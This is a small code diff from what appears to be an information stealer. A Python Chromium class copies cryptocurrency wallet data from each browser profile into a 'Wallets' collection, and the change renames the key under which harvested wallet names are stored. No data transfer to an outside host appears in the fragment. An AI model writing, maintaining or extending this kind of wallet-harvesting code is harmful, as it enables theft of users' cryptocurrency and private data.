@@ -463,7 +463,7 @@ class Chromium:
                         path.join("Wallets", rf'{self.__browser_name} {profile} {wallet["name"]}')
                     )
 
-                    self.__storage.add_data("Wallets", wallet["name"])
+                    self.__storage.add_data("Wallet", wallet["name"])
 
                 except Exception as e:
                     print(f"[{self.__browser_name}]: {repr(e)}")
